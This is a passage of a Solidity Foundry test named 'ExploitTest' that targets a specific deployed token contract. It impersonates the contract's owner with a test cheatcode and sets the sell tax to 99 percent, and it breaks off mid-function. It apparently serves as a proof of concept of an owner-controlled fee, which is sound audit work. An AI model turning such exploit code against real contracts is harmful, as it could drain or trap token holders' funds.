pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface xenoX {
    function owner() external view returns (address);
    function setSellTaxFeePercent(uint256 taxFee) external;
    function sellTaxFee() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51;
    address attacker = address(this);
    xenoX public target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = xenoX(TARGET);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        address contractOwner = target.owner();
        vm.startPrank(contractOwner);
        target.setSellTaxFeePercent(99);
